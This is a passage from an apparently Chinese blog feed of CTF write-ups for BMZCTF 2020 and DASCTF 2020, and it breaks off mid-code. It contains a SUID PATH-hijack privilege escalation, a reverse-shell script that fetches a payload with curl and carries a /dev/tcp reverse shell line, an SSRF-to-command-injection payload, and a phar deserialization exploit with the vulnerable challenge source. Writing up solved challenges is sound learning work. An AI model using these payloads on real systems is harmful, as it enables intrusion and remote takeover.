loading="lazy"><p>结果就是系统执行个ps命令</p><p>结合find发现了的一点东西</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363" loading="lazy"><p><code>/root</code>目录没有权限，也许可能考点就是提权了</p><p>这是一个具有SUID权限的程序，在tmp目录写个内容为<code>/bin/bash</code>的ps文件，添加进环境变量，这样执行程序调用ps命令会优先从这里执行，而这里是我们伪造的ps命令，然后相当于以高级权限执行了<code>/bin/bash</code>。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>成功提权，直接<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573" loading="lazy"><p>理解了师傅之前说的，提权，才是开始。</p><p>是的，权限真香，这才刚刚开始</p><p>后面再研究吧</p><p>附上一键弹shell脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/26 20:36@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有收获，不枉这两题，尤其的第二题，非常有价值。</p><p>当然不能小看第一题，别看WP短短几行，背后是无数次的尝试与探索，第二题更是如此。</p><p>2020年最后一份WP，还有很长路要走，加油吧。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2020BMZCTF-Write-up&quot;&gt;&lt;a href=&quot;#2020BMZCTF-Write-up&quot; class=&quot;headerlink&quot; title=&quot;2020BMZCTF Write-up&quot;&gt;&lt;/a&gt;2020BMZCTF Write-up&lt;/h2&gt;&lt;p&gt;随缘做了两道web&lt;/p&gt;
&lt;p&gt;昵称：Err0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Linux" scheme="https://err0r.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>2020DASctf-Writeup</title>
    <link href="https://err0r.top/article/dasctf2020/"/>
    <id>https://err0r.top/article/dasctf2020/</id>
    <published>2020-12-26T08:01:29.000Z</published>
    <updated>2021-03-30T11:49:09.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p><p>队伍成员：</p><p>gyy，Trick，X06</p><p>队伍情况：</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy"><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy"><hr><p>继续学习吧，还是太菜了</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p><p>打开即为空的json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy"><p>给了源码，关键web逻辑<code>routes\index.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>data<span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p><p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p><p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p><p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p><p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'tp1'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp2'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp3'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p><p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p><p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p><p>利用脚本生成phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token 